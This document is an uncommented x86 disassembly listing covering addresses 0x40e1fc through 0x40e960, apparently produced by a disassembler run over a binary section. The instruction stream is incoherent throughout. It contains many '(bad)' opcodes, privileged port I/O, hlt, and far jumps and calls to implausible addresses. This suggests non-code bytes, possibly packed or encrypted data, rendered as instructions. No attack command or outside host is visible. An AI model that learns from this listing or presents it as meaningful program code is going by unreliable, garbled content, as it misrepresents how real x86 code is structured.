  40e1fc:	fmul   QWORD PTR [ebp-0x13]
  40e1ff:	sub    eax,0x9d60e170
  40e204:	pushf  
  40e205:	push   0x1b
  40e207:	repnz mov ds:0x4670e54c,al
  40e20d:	or     DWORD PTR [esp+ebx*8-0x10d51479],esi
  40e214:	push   es
  40e215:	imul   ecx,esp,0x7556de7d
  40e21b:	xchg   edi,eax
  40e21c:	jg     0x40e1f4
  40e21e:	xor    al,0x3f
  40e220:	in     al,0xed
  40e222:	in     eax,dx
  40e223:	jle    0x40e1ae
  40e225:	dec    esi
  40e226:	mov    edi,DWORD PTR [ecx+edx*8-0x1d]
  40e22a:	xchg   ebx,eax
  40e22b:	mov    edx,0xe52408eb
  40e230:	cmp    BYTE PTR [ecx],0x6e
  40e233:	jmp    0xd107:0xe73626ad
  40e23a:	ret    
  40e23b:	mov    al,0xa1
  40e23d:	lds    ebx,FWORD PTR [eax-0x12]
  40e240:	mov    esi,0x869abcca
  40e245:	dec    edx
  40e246:	mov    ebp,0xefc64f1a
  40e24b:	in     al,dx
  40e24c:	call   0xba25a233
  40e251:	mov    ds:0x1e3e057e,eax
  40e256:	out    0x49,eax
  40e258:	test   al,0xb1
  40e25a:	nop
  40e25b:	pop    es
  40e25c:	loop   0x40e261
  40e25e:	gs jae 0x40e209
  40e261:	addr16 leave 
  40e263:	or     DWORD PTR [esi+ebp*1-0x66],esi
  40e267:	or     eax,0x50b21e5c
  40e26c:	mov    esp,0x490f558f
  40e271:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e272:	sbb    bl,BYTE PTR [esi+0x23]
  40e275:	jnp    0x40e2d5
  40e277:	and    eax,0xdad5bbb5
  40e27c:	fiadd  DWORD PTR [edi]
  40e27e:	xor    eax,0xaf187e91
  40e283:	dec    esi
  40e284:	cmp    eax,0x9d25e1d
  40e289:	scas   eax,DWORD PTR es:[edi]
  40e28a:	push   ebp
  40e28b:	pushf  
  40e28c:	adc    DWORD PTR [edi],esp
  40e28e:	jecxz  0x40e2bd
  40e290:	fidivr DWORD PTR [bx]
  40e293:	cmc    
  40e294:	rcl    BYTE PTR [ebx],cl
  40e296:	mov    ebp,0xb42ce2a3
  40e29b:	lods   eax,DWORD PTR es:[esi]
  40e29d:	or     BYTE PTR [ecx-0x6c32d1a],0x89
  40e2a4:	mov    bh,0x3c
  40e2a6:	dec    esp
  40e2a7:	adc    DWORD PTR [ebx+0x17],0xffffff9c
  40e2ab:	and    al,0x1b
  40e2ad:	lods   eax,DWORD PTR ds:[esi]
  40e2ae:	sbb    esp,DWORD PTR [edi+0x52]
  40e2b1:	or     al,0xc0
  40e2b3:	push   ebx
  40e2b4:	inc    esp
  40e2b5:	dec    ebp
  40e2b6:	imul   edx,DWORD PTR [esi-0x61a76b1b],0xae793dc3
  40e2c0:	xor    BYTE PTR [eax-0x93c9ab7],al
  40e2c6:	jmp    0xaec490af
  40e2cb:	test   DWORD PTR [ecx],esp
  40e2cd:	jne    0x40e252
  40e2cf:	mov    DWORD PTR [eax],eax
  40e2d1:	mov    bl,0x89
  40e2d3:	lods   al,BYTE PTR ds:[esi]
  40e2d4:	cdq    
  40e2d5:	add    ah,BYTE PTR [ebx-0x28]
  40e2d8:	jo     0x40e329
  40e2da:	xchg   ebx,eax
  40e2db:	push   edx
  40e2dc:	adc    al,ch
  40e2de:	or     al,0x8f
  40e2e0:	push   esi
  40e2e1:	popw   es
  40e2e3:	shl    DWORD PTR [eax-0x1d],cl
  40e2e6:	ds inc edi
  40e2e8:	jmp    0x40e2fb
  40e2ea:	fidivr WORD PTR [eax]
  40e2ec:	adc    DWORD PTR [ebp-0x19],ebx
  40e2ef:	pop    edi
  40e2f0:	fisubr WORD PTR [ecx]
  40e2f2:	arpl   WORD PTR [esi+0x4a],di
  40e2f5:	jne    0x40e2c7
  40e2f7:	fdivr  st,st(4)
  40e2f9:	pop    es
  40e2fa:	mov    edx,0x29b058f6
  40e2ff:	or     esp,edi
  40e301:	mov    esp,0x89371f9a
  40e306:	test   eax,0x18c954ec
  40e30c:	mov    edx,0xff197411
  40e311:	lock mov eax,ds:0x568af9bf
  40e317:	add    bh,BYTE PTR [esi-0x60]
  40e31a:	jae    0x40e335
  40e31c:	scas   eax,DWORD PTR es:[edi]
  40e31d:	cmp    al,0x37
  40e31f:	and    eax,0x33517e16
  40e324:	cmp    BYTE PTR [esi+0x53],bl
  40e327:	push   ds
  40e328:	xor    ecx,ebp
  40e32a:	mov    ds:0xba6e7404,al
  40e32f:	sbb    eax,0x81eb582d
  40e334:	loopne 0x40e2e3
  40e336:	aaa    
  40e337:	xchg   esp,eax
  40e338:	cmp    dl,BYTE PTR [ebp-0x5b]
  40e33b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e33c:	ins    DWORD PTR es:[edi],dx
  40e33d:	popf   
  40e33e:	xlat   BYTE PTR ds:[ebx]
  40e33f:	aaa    
  40e340:	test   DWORD PTR [ebx],0xd9248a71
  40e346:	sub    DWORD PTR [ebx],ecx
  40e348:	xchg   esp,eax
  40e349:	cmp    al,0x8
  40e34b:	sub    eax,0xa829ea07
  40e350:	mov    eax,ds:0xbd9c8e21
  40e355:	or     BYTE PTR [ebx+0x54],al
  40e358:	in     eax,0x18
  40e35a:	mov    ebx,0x280f81d5
  40e35f:	imul   edx,DWORD PTR [ebx-0x55fba59b],0x2061eb25
  40e369:	push   ebx
  40e36a:	mov    DWORD PTR [ecx],eax
  40e36c:	cdq    
  40e36d:	lock pop esp
  40e36f:	fidivr WORD PTR [edi-0x1e]
  40e372:	(bad)  
  40e373:	dec    ebx
  40e374:	jle    0x40e344
  40e376:	lock sar DWORD PTR [edi],0x69
  40e37a:	fs out 0xe1,eax
  40e37d:	lods   eax,DWORD PTR ds:[esi]
  40e37e:	inc    esp
  40e37f:	shr    DWORD PTR [edi+eax*4],0x4a
  40e383:	ret    0xc65
  40e386:	stc    
  40e387:	fstp   st(0)
  40e389:	pop    esp
  40e38a:	push   edx
  40e38b:	sbb    DWORD PTR [ecx+0x2f],0xc69ad019
  40e392:	adc    eax,0x49f8eb48
  40e397:	hlt    
  40e398:	xor    eax,0x6ec9d23f
  40e39d:	ret    0xa26
  40e3a0:	fld    QWORD PTR [edx]
  40e3a2:	mov    ah,0x72
  40e3a4:	jmp    0x2ef62d7f
  40e3a9:	(bad)  
  40e3aa:	adc    al,0xbf
  40e3ac:	mov    al,0xeb
  40e3ae:	xor    ah,bl
  40e3b0:	ror    edx,cl
  40e3b2:	mov    ecx,0x89eb274a
  40e3b7:	dec    ebp
  40e3b8:	cmp    eax,0xbabfc8c2
  40e3be:	lea    ecx,[esi-0x2921fbb0]
  40e3c4:	leave  
  40e3c5:	xchg   esp,eax
  40e3c6:	call   0xf1f:0x38296aa9
  40e3cd:	mov    fs,WORD PTR [eax-0x4]
  40e3d0:	dec    ecx
  40e3d1:	in     eax,0xfd
  40e3d3:	sub    eax,0xbbe7b215
  40e3d8:	ret    
  40e3d9:	xor    BYTE PTR [eiz*8+0x501d304f],dh
  40e3e0:	xor    eax,0xd2d408a0
  40e3e5:	mov    dl,0xf4
  40e3e7:	in     eax,0x58
  40e3e9:	or     edi,DWORD PTR [ebp+0x3759b9d3]
  40e3ef:	adc    edx,DWORD PTR [ebp+0x17]
  40e3f2:	mov    edi,0x8890a218
  40e3f7:	and    dl,ch
  40e3f9:	iret   
  40e3fa:	pop    edx
  40e3fb:	push   esi
  40e3fc:	div    DWORD PTR ds:0x380a2377
  40e402:	add    eax,0x72ddae13
  40e407:	ret    0x9dc
  40e40a:	pushf  
  40e40b:	fwait
  40e40c:	xor    al,0x14
  40e40e:	jae    0x40e3a2
  40e410:	push   esp
  40e411:	pop    ebx
  40e412:	dec    ebx
  40e413:	test   BYTE PTR [ecx-0x35],ah
  40e416:	fabs   
  40e418:	mov    DWORD PTR [eax-0x5734726b],ebx
  40e41e:	call   0x31e0f07b
  40e423:	mov    ds:0x3bcbc130,al
  40e428:	sbb    al,BYTE PTR [edx+0x19]
  40e42b:	inc    eax
  40e42c:	xchg   esi,eax
  40e42d:	in     eax,dx
  40e42e:	sbb    BYTE PTR [ebp-0x2f5d1cc5],cl
  40e434:	mov    dh,0x8
  40e436:	mov    esi,0xf08c38b6
  40e43b:	xor    ah,BYTE PTR [ebp+0x12]
  40e43e:	out    0x88,eax
  40e440:	aam    0xf2
  40e442:	mov    bh,0x42
  40e444:	unpcklps xmm5,XMMWORD PTR [edi+edx*2]
  40e448:	add    eax,DWORD PTR [ebx+0x1d]
  40e44b:	cmp    DWORD PTR [ecx+0x35],esp
  40e44e:	rcr    eax,0x35
  40e451:	and    ebx,edx
  40e453:	sub    ecx,DWORD PTR [eax+0x26]
  40e456:	xchg   DWORD PTR [ecx],ebx
  40e458:	or     al,0x59
  40e45a:	test   eax,0x79fe86fa
  40e45f:	gs hlt 
  40e461:	mov    cl,0xa3
  40e463:	out    0x74,al
  40e465:	popf   
  40e466:	sbb    edi,DWORD PTR [eax]
  40e468:	xchg   edi,eax
  40e469:	jnp    0x40e46a
  40e46b:	ds add al,0xd0
  40e46e:	fwait
  40e46f:	loop   0x40e443
  40e471:	out    dx,eax
  40e472:	xchg   DWORD PTR [ebx-0x4],ebx
  40e475:	sub    al,dh
  40e477:	cwde   
  40e478:	test   eax,0x5bd0f6a
  40e47d:	xor    bl,BYTE PTR [edx+0x1b]
  40e480:	xchg   al,ch
  40e482:	popf   
  40e483:	outs   dx,BYTE PTR ds:[esi]
  40e484:	mov    eax,0xf35c0e8b
  40e489:	jb     0x40e49b
  40e48b:	ds jae 0x40e4b4
  40e48e:	loope  0x40e4aa
  40e490:	dec    ebp
  40e491:	ins    DWORD PTR es:[edi],dx
  40e492:	repnz in al,dx
  40e494:	(bad)  
  40e495:	push   ss
  40e496:	pop    ss
  40e497:	(bad)  
  40e498:	cmp    esp,DWORD PTR [eax]
  40e49a:	adc    al,0x2
  40e49c:	ret    
  40e49d:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  40e49f:	inc    edx
  40e4a0:	pusha  
  40e4a1:	adc    BYTE PTR [ecx-0x45],al
  40e4a4:	loop   0x40e452
  40e4a6:	mov    ds:0xcc7da011,al
  40e4ab:	scas   eax,DWORD PTR es:[edi]
  40e4ac:	ret    
  40e4ad:	push   0xfe6950c7
  40e4b2:	inc    eax
  40e4b3:	add    dl,ch
  40e4b5:	inc    ebp
  40e4b6:	jb     0x40e4f1
  40e4b8:	ins    DWORD PTR es:[edi],dx
  40e4b9:	arpl   WORD PTR ds:0x76272b4b,sp
  40e4bf:	inc    eax
  40e4c0:	scas   al,BYTE PTR es:[edi]
  40e4c1:	lock enter 0x2370,0x46
  40e4c6:	sbb    eax,0xaf468521
  40e4cb:	cmp    eax,0x450b6040
  40e4d0:	ret    0x6f67
  40e4d3:	sahf   
  40e4d4:	cmp    DWORD PTR [edi-0x26],ecx
  40e4d7:	aas    
  40e4d8:	bound  ecx,QWORD PTR [ebx]
  40e4da:	les    esi,FWORD PTR [ebx]
  40e4dc:	mov    esi,0x6daf6177
  40e4e1:	repnz cmp ebx,DWORD PTR [ecx]
  40e4e4:	mov    cl,0xaf
  40e4e6:	stos   BYTE PTR es:[edi],al
  40e4e7:	or     DWORD PTR [ebp+0x6d780310],edx
  40e4ed:	cmp    al,0x22
  40e4ef:	js     0x40e50a
  40e4f1:	stos   BYTE PTR es:[edi],al
  40e4f2:	jnp    0x40e56d
  40e4f4:	cwde   
  40e4f5:	xchg   edi,eax
  40e4f6:	test   esi,esi
  40e4f8:	stos   BYTE PTR es:[edi],al
  40e4f9:	aas    
  40e4fa:	sti    
  40e4fb:	mov    esp,0x132f14f3
  40e500:	bound  esp,QWORD PTR [edi-0x30]
  40e503:	fs (bad) 
  40e505:	fdivr  QWORD PTR ds:0xdef64d15
  40e50b:	test   BYTE PTR [eax-0x48b516f0],0x5b
  40e512:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e513:	add    BYTE PTR [edi-0xc],cl
  40e516:	lea    ecx,[edx-0x50]
  40e519:	jl     0x40e4c0
  40e51b:	sahf   
  40e51c:	jbe    0x40e539
  40e51e:	or     DWORD PTR [ebx-0x258f4533],edx
  40e524:	scas   eax,DWORD PTR es:[edi]
  40e525:	fdivr  st,st(5)
  40e527:	inc    edx
  40e528:	mov    cl,0x7c
  40e52a:	bound  edi,QWORD PTR [esp+edi*2]
  40e52d:	inc    edi
  40e52e:	xor    eax,DWORD PTR [esp+edi*1]
  40e531:	xchg   edx,eax
  40e532:	test   BYTE PTR [edx+0x191b6e9b],ch
  40e538:	dec    ecx
  40e539:	and    ebx,DWORD PTR [ebx+ebx*4+0x5e]
  40e53d:	sub    bl,BYTE PTR [edi-0x37]
  40e540:	and    cl,dh
  40e542:	push   cs
  40e543:	jmp    0x621a:0xe9621d49
  40e54a:	xchg   esi,eax
  40e54b:	imul   esi,DWORD PTR [ecx-0x29852031],0x76
  40e552:	jg     0x40e50c
  40e554:	dec    ecx
  40e555:	lods   eax,DWORD PTR ds:[esi]
  40e556:	dec    edi
  40e557:	add    bx,WORD PTR [eax+edx*1+0x5b03a3d2]
  40e55f:	cmp    dl,BYTE PTR [esi+0x4a]
  40e562:	data16 das 
  40e564:	sbb    esi,DWORD PTR [esi-0x32]
  40e567:	mov    ecx,0x82674636
  40e56c:	outs   dx,DWORD PTR ds:[esi]
  40e56d:	lds    ebp,FWORD PTR [ecx+0x6958e478]
  40e573:	cdq    
  40e574:	cli    
  40e575:	push   edi
  40e576:	add    eax,0x117e041d
  40e57b:	and    BYTE PTR [esi-0x744f3455],0x9d
  40e582:	sbb    edi,DWORD PTR [eax*1+0x21a40b2b]
  40e589:	pop    edi
  40e58a:	jno    0x40e578
  40e58c:	fxch   st(0)
  40e58e:	jns    0x40e573
  40e590:	xor    DWORD PTR [edi],0x10
  40e593:	shl    DWORD PTR [eax+0x32],cl
  40e596:	scas   eax,DWORD PTR es:[edi]
  40e597:	cmc    
  40e598:	jnp    0x40e562
  40e59a:	pop    ecx
  40e59b:	into   
  40e59c:	pop    es
  40e59d:	iret   
  40e59e:	sbb    BYTE PTR [ebx],cl
  40e5a0:	test   BYTE PTR [esi],dh
  40e5a2:	xchg   edx,eax
  40e5a3:	inc    edx
  40e5a4:	adc    BYTE PTR [ebx+ebp*8-0x27],dl
  40e5a8:	or     al,0xa3
  40e5aa:	clc    
  40e5ab:	shl    DWORD PTR [eax+esi*1-0x17789065],1
  40e5b2:	test   BYTE PTR [edi-0x6b],0x86
  40e5b6:	mov    bl,0xe8
  40e5b8:	mov    ch,0x76
  40e5ba:	ret    
  40e5bb:	ins    DWORD PTR es:[edi],dx
  40e5bc:	jge    0x40e58b
  40e5be:	pop    edx
  40e5bf:	mov    ch,0xe2
  40e5c1:	loop   0x40e640
  40e5c3:	icebp  
  40e5c4:	adc    BYTE PTR [edi],ah
  40e5c6:	mov    bh,0x94
  40e5c8:	and    eax,0x1a340fa
  40e5cd:	sar    DWORD PTR [ecx+0x74],0x82
  40e5d1:	into   
  40e5d2:	push   esp
  40e5d3:	mov    eax,ds:0xadb7dc13
  40e5d8:	add    ebx,0x93f5fffa
  40e5de:	jno    0x40e60f
  40e5e0:	ret    
  40e5e1:	lahf   
  40e5e2:	pop    edi
  40e5e3:	fwait
  40e5e4:	jmp    0x40e630
  40e5e6:	out    dx,eax
  40e5e7:	es mov ch,0x53
  40e5ea:	mov    bl,0x78
  40e5ec:	cwde   
  40e5ed:	pusha  
  40e5ee:	repnz xchg ebx,eax
  40e5f0:	aad    0x7
  40e5f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e5f3:	xchg   BYTE PTR [esi+0x17e14f2d],ch
  40e5f9:	inc    ebx
  40e5fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e5fb:	aad    0xc3
  40e5fd:	mov    esp,0x56524772
  40e602:	mov    al,ds:0xb0cba90a
  40e607:	or     edx,DWORD PTR [ebx]
  40e609:	in     al,dx
  40e60a:	sbb    al,BYTE PTR [esi]
  40e60c:	cld    
  40e60d:	and    DWORD PTR ds:0xa17dd577,0x26
  40e614:	dec    edi
  40e615:	adc    eax,0xbdde7e94
  40e61a:	jne    0x40e60f
  40e61c:	clc    
  40e61d:	repz jl 0x40e636
  40e620:	out    dx,eax
  40e621:	pop    ebx
  40e622:	pop    ss
  40e623:	inc    ebp
  40e624:	pop    esi
  40e625:	sub    cl,dl
  40e627:	dec    ebp
  40e628:	push   edi
  40e629:	das    
  40e62a:	and    eax,0x4b430ee5
  40e62f:	aam    0x19
  40e631:	pop    eax
  40e632:	pop    ebx
  40e633:	les    esi,FWORD PTR [ebp+0xe34dcbc]
  40e639:	scas   eax,DWORD PTR es:[edi]
  40e63a:	sahf   
  40e63b:	sub    al,0x29
  40e63d:	fst    st(6)
  40e63f:	dec    edx
  40e640:	sub    BYTE PTR [edi+0x2125ab27],bl
  40e646:	cmp    DWORD PTR [edx+0x63a5b08f],esp
  40e64c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e64d:	test   al,0x6b
  40e64f:	xchg   esi,eax
  40e650:	add    BYTE PTR ds:0x1a5ec21a,0xe7
  40e657:	pop    ds
  40e658:	add    eax,0x224e6be0
  40e65d:	xchg   esi,eax
  40e65e:	sub    al,bl
  40e660:	dec    ebx
  40e661:	ss mov dl,0x50
  40e664:	loop   0x40e637
  40e666:	add    DWORD PTR [eax+0x63],ebx
  40e669:	jmp    0x71f2612b
  40e66e:	cwde   
  40e66f:	xor    eax,edi
  40e671:	sbb    esp,esi
  40e673:	stos   DWORD PTR es:[edi],eax
  40e674:	push   edx
  40e675:	sbb    dh,al
  40e677:	out    dx,eax
  40e678:	ins    BYTE PTR es:[edi],dx
  40e679:	inc    ecx
  40e67a:	xor    edi,DWORD PTR ds:0x85fd9484
  40e680:	std    
  40e681:	mov    ebx,0x5eb165f4
  40e686:	mov    ecx,0x31db10a4
  40e68b:	xor    BYTE PTR [eax+0x27ddd236],dl
  40e691:	(bad)  
  40e693:	aad    0xa3
  40e695:	aas    
  40e696:	mov    al,ds:0xd56e386d
  40e69b:	ins    BYTE PTR es:[edi],dx
  40e69c:	ret    
  40e69d:	mov    dl,0x26
  40e69f:	das    
  40e6a0:	popa   
  40e6a1:	adc    eax,0x638b900d
  40e6a6:	sbb    eax,0x27a95976
  40e6ab:	lods   eax,DWORD PTR ds:[esi]
  40e6ac:	sub    al,0xb
  40e6ae:	xchg   ebp,eax
  40e6af:	stc    
  40e6b0:	jae    0x40e70f
  40e6b2:	push   esp
  40e6b3:	js     0x40e68b
  40e6b5:	adc    edx,esp
  40e6b7:	mov    ebp,DWORD PTR [ebp-0x1e]
  40e6ba:	and    dh,al
  40e6bc:	(bad)  
  40e6bd:	xor    al,0x1f
  40e6bf:	(bad)  
  40e6c1:	push   esp
  40e6c2:	pop    ds
  40e6c3:	rcl    DWORD PTR [edi+0x52],1
  40e6c6:	sub    al,0xa6
  40e6c8:	mov    dh,0xf8
  40e6ca:	xchg   ebx,eax
  40e6cb:	fistp  DWORD PTR [edi-0x4231e7c6]
  40e6d1:	ret    
  40e6d2:	jmp    0x40e6bc
  40e6d4:	jb     0x40e70f
  40e6d6:	pop    DWORD PTR [esi-0x6be74880]
  40e6dc:	lock in al,0xf2
  40e6df:	mov    ds:0xc85fa42,eax
  40e6e4:	loope  0x40e68a
  40e6e6:	cmp    eax,0x44722434
  40e6eb:	push   eax
  40e6ec:	out    dx,eax
  40e6ed:	jg     0x40e6b2
  40e6ef:	out    0xba,al
  40e6f1:	mov    ds:0x2af3fdd3,al
  40e6f6:	aad    0x58
  40e6f8:	mov    dh,0xb6
  40e6fa:	shr    dl,cl
  40e6fc:	sbb    eax,0xb50f2230
  40e701:	mov    cl,0xfc
  40e703:	push   edi
  40e704:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e705:	sbb    al,BYTE PTR [eax-0x78]
  40e708:	mov    edx,DWORD PTR [edi-0x6e48f8d6]
  40e70e:	cmp    eax,0x21a8c5f1
  40e713:	jg     0x40e779
  40e715:	sbb    eax,0xbfc9e3b8
  40e71a:	cmp    eax,0xac8ab04d
  40e71f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e720:	bound  edx,QWORD PTR [esi+edi*8]
  40e723:	popf   
  40e724:	cdq    
  40e725:	lds    esi,FWORD PTR [ebx-0x67520386]
  40e72b:	push   cs
  40e72c:	jo     0x40e757
  40e72e:	add    ebp,DWORD PTR [eax+esi*1-0x18362a0a]
  40e735:	rcr    DWORD PTR [ebx+edx*2+0xc],cl
  40e739:	inc    edi
  40e73a:	cdq    
  40e73b:	sub    BYTE PTR [esi],dl
  40e73d:	inc    esi
  40e73e:	or     eax,0x559ce06d
  40e743:	cli    
  40e744:	jns    0x40e750
  40e746:	xchg   edx,eax
  40e747:	shl    cl,cl
  40e749:	xchg   ecx,eax
  40e74a:	(bad)  
  40e74b:	icebp  
  40e74c:	(bad)  
  40e74d:	ror    DWORD PTR [ecx+0x6a],1
  40e750:	outs   dx,DWORD PTR ds:[esi]
  40e751:	jl     0x40e7d1
  40e753:	in     al,dx
  40e754:	sbb    DWORD PTR [esi-0x21],ebp
  40e757:	out    0x2,eax
  40e759:	outs   dx,BYTE PTR ds:[esi]
  40e75a:	or     DWORD PTR [ebp-0x5c],0xd03f645c
  40e761:	neg    DWORD PTR [edi]
  40e763:	in     al,dx
  40e764:	mov    al,ds:0x47d61568
  40e769:	stos   DWORD PTR es:[edi],eax
  40e76a:	jb     0x40e733
  40e76c:	and    eax,0x6f2f0f6f
  40e771:	jl     0x40e794
  40e773:	xchg   edx,eax
  40e774:	add    al,0x1e
  40e776:	leave  
  40e777:	stos   BYTE PTR es:[edi],al
  40e778:	or     BYTE PTR [edi],ah
  40e77a:	jae    0x40e790
  40e77c:	mov    eax,0xb8d64e41
  40e781:	pusha  
  40e782:	sbb    al,0x5b
  40e784:	ficom  DWORD PTR [ebp+0x7d]
  40e787:	dec    esp
  40e788:	cs sub ax,0x235a
  40e78d:	pushw  0xffaf
  40e790:	mov    ebx,0x5187db7f
  40e795:	cmp    DWORD PTR [esi],esi
  40e797:	pop    eax
  40e798:	pop    esi
  40e799:	push   ebx
  40e79a:	pop    ebx
  40e79b:	inc    eax
  40e79c:	xchg   esp,eax
  40e79d:	imul   ecx,DWORD PTR ds:0x6708c833,0x4d
  40e7a4:	lds    eax,FWORD PTR [eax]
  40e7a6:	jg     0x40e741
  40e7a8:	jnp    0x40e81d
  40e7aa:	sti    
  40e7ab:	dec    edx
  40e7ac:	pop    ds
  40e7ad:	shl    DWORD PTR [edi+0x5c],1
  40e7b0:	ja     0x40e781
  40e7b2:	inc    esi
  40e7b3:	push   es
  40e7b4:	leave  
  40e7b5:	push   0x395c4f4e
  40e7ba:	jns    0x40e835
  40e7bc:	outs   dx,BYTE PTR ds:[esi]
  40e7bd:	add    al,0x96
  40e7bf:	mov    bl,0x9e
  40e7c1:	dec    esp
  40e7c2:	mov    esp,0xd4bc9891
  40e7c7:	fwait
  40e7c8:	jmp    DWORD PTR [esi+eax*1+0x73fe1d51]
  40e7cf:	addr16 pop ebp
  40e7d1:	xchg   esp,ebp
  40e7d3:	xor    BYTE PTR [edi],bh
  40e7d5:	jge    0x40e7e0
  40e7d7:	jns    0x40e7d3
  40e7d9:	(bad)
  40e7dc:	pop    ss
  40e7dd:	push   0xdaacaf59
  40e7e2:	xor    al,0x0
  40e7e4:	xor    esi,DWORD PTR [edi-0x6952fb8b]
  40e7ea:	jmp    0x40e7c1
  40e7ec:	push   esp
  40e7ed:	or     bh,BYTE PTR ds:0xb7d7a447
  40e7f3:	inc    ecx
  40e7f4:	(bad)
  40e7f7:	xchg   ebx,eax
  40e7f8:	test   al,0x84
  40e7fa:	test   eax,0x67c61db9
  40e7ff:	cmp    DWORD PTR [edx-0xf],esp
  40e802:	les    ebp,FWORD PTR [edx]
  40e804:	fwait
  40e805:	mov    bl,0x72
  40e807:	pop    edx
  40e808:	pop    esi
  40e809:	jmp    FWORD PTR [ebx]
  40e80b:	xchg   ebx,eax
  40e80c:	pop    esi
  40e80d:	ds lahf 
  40e80f:	jo     0x40e801
  40e811:	inc    ebx
  40e812:	jae    0x40e7f0
  40e814:	add    eax,0xf4206f57
  40e819:	pop    ebp
  40e81a:	push   ebx
  40e81b:	sbb    edx,ecx
  40e81d:	in     eax,dx
  40e81e:	and    DWORD PTR [edi],esp
  40e820:	xor    al,0x77
  40e822:	popa   
  40e823:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e824:	out    dx,al
  40e825:	mov    ecx,0x527bf943
  40e82a:	add    DWORD PTR [eax+eiz*1],ebp
  40e82d:	mov    ah,0xe7
  40e82f:	(bad)  
  40e830:	sub    eax,0x92800428
  40e835:	inc    ecx
  40e836:	pop    eax
  40e837:	mov    ch,ch
  40e839:	jl     0x40e8a0
  40e83b:	iret   
  40e83c:	sub    DWORD PTR [esi+edx*8-0x5ee23896],ebp
  40e843:	iret   
  40e844:	retf   
  40e845:	aam    0xed
  40e847:	mov    bh,0xb
  40e849:	sub    bl,ch
  40e84b:	sbb    edx,DWORD PTR [edi+0x3d]
  40e84e:	jmp    0x40e816
  40e850:	fucomi st,st(0)
  40e852:	mov    cs,WORD PTR [edi-0x4ad92843]
  40e858:	sub    BYTE PTR es:[edi-0x5c],dl
  40e85c:	push   es
  40e85d:	cld    
  40e85e:	jmp    0x40e8b4
  40e860:	dec    edx
  40e861:	(bad)  [esi]
  40e863:	mov    ds:0xe155b342,eax
  40e868:	test   eax,0x6e52ccb6
  40e86d:	fld    QWORD PTR [ecx-0x5857c164]
  40e873:	int3   
  40e874:	rol    BYTE PTR [ebp+0x78],1
  40e877:	adc    eax,0xa466c4ae
  40e87c:	mov    DWORD PTR [ebx],ebx
  40e87e:	retf   
  40e87f:	cs or  al,0x71
  40e882:	mov    ah,0xac
  40e884:	and    DWORD PTR [edx],0xb
  40e887:	inc    ebx
  40e888:	sti    
  40e889:	fld    TBYTE PTR [ebx+0x32]
  40e88c:	dec    ecx
  40e88d:	out    0x89,al
  40e88f:	fiadd  WORD PTR [ebx-0x21cce4ba]
  40e895:	sub    DWORD PTR [ebx],esp
  40e897:	sbb    BYTE PTR [esi],al
  40e899:	gs scas eax,DWORD PTR es:[edi]
  40e89b:	test   eax,0x1725c1a5
  40e8a0:	push   0x6d
  40e8a2:	xor    esi,DWORD PTR [ebx-0x14ce0a80]
  40e8a8:	jmp    DWORD PTR [ebx]
  40e8aa:	xlat   BYTE PTR ds:[ebx]
  40e8ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e8ac:	dec    eax
  40e8ad:	pop    edi
  40e8ae:	xor    bh,BYTE PTR [ecx]
  40e8b0:	pop    ecx
  40e8b1:	dec    edi
  40e8b2:	scas   eax,DWORD PTR es:[edi]
  40e8b3:	pop    esi
  40e8b4:	retf   0x38db
  40e8b7:	leave  
  40e8b8:	sbb    esi,esi
  40e8ba:	push   0xa105151a
  40e8bf:	leave  
  40e8c0:	mov    BYTE PTR [edi],al
  40e8c2:	jp     0x40e85b
  40e8c4:	and    esi,DWORD PTR [edi+0x1ff4fdc4]
  40e8ca:	or     DWORD PTR [edi-0x4f],edi
  40e8cd:	sbb    ch,dl
  40e8cf:	xor    al,0xda
  40e8d1:	ds loopne 0x40e880
  40e8d4:	retf   
  40e8d5:	pop    ss
  40e8d6:	sbb    al,0xc
  40e8d8:	mov    dh,0x83
  40e8da:	pop    es
  40e8db:	retf   
  40e8dc:	mov    DWORD PTR [edx],0xd44a74cb
  40e8e2:	adc    BYTE PTR [edx],dh
  40e8e4:	call   0xaa6b0b10
  40e8e9:	scas   eax,DWORD PTR es:[edi]
  40e8ea:	out    0x8a,al
  40e8ec:	scas   eax,DWORD PTR es:[edi]
  40e8ed:	jnp    0x40e8f5
  40e8ef:	inc    edx
  40e8f0:	cmp    BYTE PTR [edx+edx*4-0x1f],bl
  40e8f4:	aaa    
  40e8f5:	dec    edi
  40e8f6:	call   0x9aaad23f
  40e8fb:	shl    BYTE PTR [ecx],cl
  40e8fd:	ror    DWORD PTR [edi],1
  40e8ff:	push   cs
  40e900:	cmc    
  40e901:	out    0x21,al
  40e903:	jmp    0x9615:0x5d9d3c8a
  40e90a:	sbb    al,0x16
  40e90c:	bound  esi,QWORD PTR [esi-0x6cec4613]
  40e912:	xchg   esi,eax
  40e913:	and    BYTE PTR [esp+esi*8],al
  40e916:	mov    ch,0xee
  40e918:	mov    BYTE PTR [eax],dl
  40e91a:	dec    edi
  40e91b:	cmc    
  40e91c:	iret   
  40e91d:	sbb    ebx,DWORD PTR [ebx]
  40e91f:	jl     0x40e8e3
  40e921:	jl     0x40e979
  40e923:	or     al,0xcf
  40e925:	mov    ds:0xc0e44c6d,eax
  40e92a:	mov    eax,0x2ff2c407
  40e92f:	push   esi
  40e930:	pop    esi
  40e931:	pop    ecx
  40e932:	aas    
  40e933:	imul   ecx,DWORD PTR [ecx+0x5b955cc4],0x31
  40e93a:	inc    ebp
  40e93b:	repnz sbb edi,DWORD PTR [eax+0x78]
  40e93f:	cmp    esp,DWORD PTR [ebx+esi*2+0x589025a2]
  40e946:	mov    bl,0x72
  40e948:	aad    0xf8
  40e94a:	aad    0x30
  40e94c:	sti    
  40e94d:	xchg   ebx,eax
  40e94e:	icebp  
  40e94f:	jp     0x40e940
  40e951:	dec    esp
  40e952:	mov    edi,0xca87a442
  40e957:	and    bl,cl
  40e959:	fsub   st,st(7)
  40e95b:	cmp    ah,dl
  40e95d:	neg    DWORD PTR [edi-0x3d]
  40e960:	and    bl,BYTE PTR [edx]
